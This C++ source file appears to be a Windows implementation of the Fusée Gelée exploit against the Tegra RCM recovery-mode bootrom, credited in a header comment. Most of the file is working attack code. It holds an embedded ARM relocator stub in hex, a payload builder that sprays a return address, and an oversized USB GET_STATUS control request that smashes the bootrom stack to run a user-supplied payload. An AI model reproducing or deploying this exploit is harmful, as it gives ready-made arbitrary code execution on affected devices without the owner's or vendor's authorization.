#include "rcm_device.h"
#include <winioctl.h>
#include <iostream>
#include <fstream>

using namespace std;

RcmDevice::RcmDevice()
{
    m_currentBuffer = 0;
    m_b_RcmReady = false;
}

bool RcmDevice::initDevice(KLST_DEVINFO_HANDLE deviceInfo)
{
    m_b_RcmReady = false;

    if (deviceInfo != nullptr)
        m_devInfo = deviceInfo;
    else
        getPluggedDevice();

    if (m_devInfo != nullptr && loadDevice() == SUCCESS)
        m_b_RcmReady = true;

    return m_b_RcmReady;
}

bool RcmDevice::getPluggedDevice()
{
    if (m_devList != nullptr)
        LstK_Free(m_devList);

    u32 devCount = 0;

    if (!LstK_Init(&m_devList, KLST_FLAG_NONE))
        return false;

    LstK_Count(m_devList, &devCount);

    if (devCount == 0 || !LstK_FindByVidPid(m_devList, RCM_VID, RCM_PID, &m_devInfo))
        return false;

    if (m_devInfo == nullptr)
        return false;

    return true;
}

RRESULT RcmDevice::loadDevice()
{
    if (m_devInfo == nullptr)
        return DEVICE_NOT_FOUND;

    if (m_devInfo->DriverID != KUSB_DRVID_LIBUSBK)
        return MISSING_LIBUSBK_DRIVER;

    LibK_LoadDriverAPI(&m_usbApi, m_devInfo->DriverID);

    if (!m_usbApi.Init(&m_usbHandle, m_devInfo))
        return DEVICE_HANDLE_FAILED;

    libusbk::libusb_request req;
    memset(&req, 0, sizeof(req));
    int res = Ioctl(libusbk::LIBUSB_IOCTL_GET_VERSION, &req, sizeof(req), &req, sizeof(req));

    if (res <= 0)
        return DEVICE_HANDLE_FAILED;

    libusbk::version_t usbkVersion = req.version;
    if (usbkVersion.major != 3 || usbkVersion.minor != 0 || usbkVersion.micro != 7)
        return LIBUSBK_WRONG_DRIVER;

    vector<u8> deviceId(0x10, 0);
    if(read(&deviceId[0], 0x10) != int(deviceId.size()))
        return DEVICEID_READ_FAILED;

    return SUCCESS;
}

int RcmDevice::read(u8* buffer, size_t bufferSize)
{
    size_t bytesRead;
    if (!m_usbApi.ReadPipe(m_usbHandle, 0x81, buffer, bufferSize, &bytesRead, nullptr))
        return -int(GetLastError());

    return int(bytesRead);
}

int RcmDevice::write(const u8* buffer, size_t bufferSize)
{
    size_t bytesRemaining = int(bufferSize);
    size_t bytesWritten = 0;

    while (bytesRemaining > 0)
    {
        const size_t bytesToWrite = (bytesRemaining < PACKET_SIZE) ? bytesRemaining : PACKET_SIZE;
        m_currentBuffer = (m_currentBuffer == 0) ? 1u : 0u;
        size_t bytesTransfered = 0;
        if(!m_usbApi.WritePipe(m_usbHandle, 0x01, (u8*)&buffer[bytesWritten], bytesToWrite, &bytesTransfered, nullptr))
            return -int(GetLastError());

        bytesWritten += bytesTransfered;
        bytesRemaining -= bytesTransfered;
    }

    return int(bytesWritten);
}

const byte BUILTIN_INTERMEZZO[] =
{
    0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
    0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
    0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
    0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
    0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
    0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
};

/*
 * Fusée Gelée eXploit
 * -------------------
 * Author / Reporter : Katherine Temkin (@ktemkin)
 * Affiliation : ReSwitched
 * Disclosure : public disclosure planned for June 15th, 2018 ^^
 * Credits : @rajkosto for windows reimplementation (TegraRcmSmash)
 *
 */
RRESULT RcmDevice::hack(const char* user_payload_path)
{
    // Control user payload
    ifstream userPayload(user_payload_path, ios::in | ios::binary | ios::ate);
    if (!userPayload.is_open())
        return OPEN_FILE_FAILED;

    const auto userPayloadSize = int(userPayload.tellg());
    if (userPayloadSize > 0x1ED58)
        return PAYLOAD_TOO_LARGE;

    // Read the user payload file into memory & release file
    userPayload.seekg(0, ios::beg);

    char *userPayloadBuffer = new char[userPayloadSize];
    userPayload.read(&userPayloadBuffer[0], userPayloadSize);
    bool error = !(userPayload) || int(userPayload.tellg()) != userPayloadSize;
    userPayload.close();
    if (error)
    {
        delete[] userPayloadBuffer;
        return OPEN_FILE_FAILED;
    }
    // Inits
    std::vector<byte> payload; // Full payload (relocator + user payload)
    size_t currOffset = 0; // Payload current offset
    constexpr u32 RCM_PAYLOAD_ADDR    = 0x40010000; // The address where the RCM payload is placed
    constexpr u32 INTERMEZZO_LOCATION = 0x4001F000;
    constexpr u32 PAYLOAD_LOAD_BLOCK  = 0x40020000;
    constexpr size_t PAYLOAD_TOTAL_MAX_SIZE = 0x30000;

    /// Prefix the image with an RCM command, so it winds up loaded into memory at the right location (RCM_PAYLOAD_ADDR).
    // Use the maximum length accepted by RCM, so we can transmit as much payload as we want.
    // We'll take over before we get to the end.
    const u32 length = 0x30298;
    payload.resize(sizeof(length));
    memcpy(&payload[currOffset], &length, sizeof(length));
    payload.resize(680, 0); // Pad out to 680 so the payload starts at the right address in IRAM
    currOffset = payload.size();

    // Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
    // We'll use this data to smash the stack when we execute the vulnerable memcpy.
    payload.resize(payload.size() + INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR);
    while (currOffset < payload.size())
    {
        const u32 data = INTERMEZZO_LOCATION;
        memcpy(&payload[currOffset], &data, sizeof(INTERMEZZO_LOCATION));
        currOffset += sizeof(INTERMEZZO_LOCATION);
    }

    // Include the builtin intermezzo in the command stream. This is our first-stage
    // payload, and it's responsible for relocating the final payload to RCM_PAYLOAD_ADDR
    payload.resize(payload.size() + sizeof(BUILTIN_INTERMEZZO));
    memcpy(&payload[currOffset], BUILTIN_INTERMEZZO, sizeof(BUILTIN_INTERMEZZO));
    currOffset += sizeof(BUILTIN_INTERMEZZO);

    // Finally, pad until we've reached the position we need to put the payload.
    // This ensures the payload winds up at the location Intermezzo expects.
    const auto paddingSize = PAYLOAD_LOAD_BLOCK - INTERMEZZO_LOCATION + sizeof(BUILTIN_INTERMEZZO);
    payload.resize(payload.size() + paddingSize, 0);
    currOffset += paddingSize;

    // Include the user payload in the command stream
    payload.resize(payload.size() + userPayloadSize);
    memcpy(&payload[currOffset], &userPayloadBuffer[0], userPayloadSize);
    currOffset += userPayloadSize;
    delete[] userPayloadBuffer;

    // Pad the payload to fill a USB request exactly, so we don't send a short
    // packet and break out of the RCM loop
    if (payload.size() < PAYLOAD_TOTAL_MAX_SIZE)
        payload.resize(align_up(payload.size(), PACKET_SIZE), 0);
    else
        payload.resize(PAYLOAD_TOTAL_MAX_SIZE);

    int test = int(payload.size());

    // Send the constructed payload, which contains the command, the stack smashing values,
    // the Intermezzo relocation stub, and the user payload.
    int bytesWritten = write(&payload[0], payload.size());
    if (bytesWritten < payload.size())
        return USB_WRITE_FAILED;

    // The RCM backend alternates between two different DMA buffers. Ensure we're about to DMA
    // into the higher one, so we have less to copy during our attack.
    if (switchToHighBuffer() != 0)
        return SW_HIGHBUFF_FAILED;

    // Smash the stack
    int stLength = RCM_PAYLOAD_ADDR - getCurrentBufferAddress();
    std::vector<byte> threshBuf(stLength, 0);

    libusbk::libusb_request req;
    memset(&req, 0, sizeof(req));
    req.timeout= 1000;
    req.status.index = 0;
    req.status.recipient = 0x02;

    int res = Ioctl(libusbk::LIBUSB_IOCTL_GET_STATUS, &req, sizeof(req), &threshBuf[0], threshBuf.size());

    if (res <= 0 && -res != ERROR_SEM_TIMEOUT)
        return STACK_SMASH_FAILED;
    else
        return SUCCESS;
}

int RcmDevice::Ioctl(DWORD ioctlCode, const void* inputBytes, size_t numInputBytes, void* outputBytes, size_t numOutputBytes)
{
    HANDLE driverHandle = INVALID_HANDLE_VALUE;
    if (!libusbk_getInternals(m_usbHandle, &driverHandle) || driverHandle == nullptr || driverHandle == INVALID_HANDLE_VALUE)
        return -int(DEVICE_HANDLE_FAILED);

    WinHandle ev = CreateEvent(nullptr, true, false, nullptr);
    if (ev.get() == nullptr || ev.get() == INVALID_HANDLE_VALUE)
        return -int(DEVICE_HANDLE_FAILED);

    OVERLAPPED overlapped;
    memset(&overlapped, 0, sizeof(overlapped));
    if (!DeviceIoControl(driverHandle, ioctlCode, (LPVOID)inputBytes, (DWORD)numInputBytes, (LPVOID)outputBytes, (DWORD)numOutputBytes, nullptr, &overlapped))
    {
        auto err = GetLastError();
        if (err != ERROR_IO_PENDING)
            return -int(err);
    }

    DWORD bytesReceived = 0;
    if (!GetOverlappedResult(driverHandle, &overlapped, &bytesReceived, true))
        return -int(GetLastError());

    return bytesReceived;
}

int RcmDevice::switchToHighBuffer()
{
    if (m_currentBuffer == 0)
    {
        u8 tempZeroDatas[PACKET_SIZE];
        memset(tempZeroDatas, 0, sizeof(tempZeroDatas));

        const auto writeRes = write(tempZeroDatas, sizeof(tempZeroDatas));
        if (writeRes < 0)
            return writeRes;

        return writeRes;
    }
    else
        return 0;
}



